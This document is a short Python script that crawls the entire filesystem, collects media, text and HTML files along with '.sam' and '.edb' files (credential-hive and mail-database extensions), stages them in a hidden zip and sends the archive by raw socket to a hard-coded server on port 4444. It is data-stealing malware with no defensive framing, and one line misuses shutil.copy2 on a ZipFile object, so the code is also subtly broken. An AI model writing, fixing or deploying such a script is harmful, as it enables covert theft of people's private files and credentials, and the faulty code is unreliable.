import argparse
import os
import shutil
import socket
import zipfile

def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('--directory', '-d', default='/', help='Root directory to search for media files')
    parser.add_argument('--output', '-o', default='.hidden/media_files.zip', help='Output path and filename of the zip file')
    parser.add_argument('--server', '-s', default='192.168.67.151', help='IP address of the server to send the zip file to')
    parser.add_argument('--port', '-p', type=int, default=4444, help='Port number of the server to send the zip file to')
    args = parser.parse_args()

    # Get the root directory
    root_directory = os.path.abspath(args.directory)

    # Set the media extensions to filter
    media_extensions = [".mp3", ".mp4", ".wav", ".avi", ".jpg", ".jpeg", ".text", ".txt", ".sam", ".html", ".htm", ".edb"]

    # Create a ZipFile object to save the media files to
    zip_file_path = os.path.abspath(args.output)
    if not os.path.exists(os.path.dirname(zip_file_path)):
        os.makedirs(os.path.dirname(zip_file_path))

    with zipfile.ZipFile(zip_file_path, 'w') as zip_file:
        # Walk through every directory and file in the root directory
        for directory_path, directory_names, file_names in os.walk(root_directory):
            # Filter the files by extension
            media_files = (os.path.join(directory_path, file_name) for file_name in file_names if os.path.splitext(file_name)[1] in media_extensions)
            # Add the media files to the zip file
            for media_file in media_files:
                try:
                    shutil.copy2(media_file, zip_file)
                except PermissionError:
                    pass

    # Send the zip file to a server
    ip_address = args.server
    port = args.port

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((ip_address, port))
        with open(zip_file_path, 'rb') as file:
            while True:
                data = file.read(1024)
                if not data:
                    break
                sock.sendall(data)

if __name__ == '__main__':
    main()
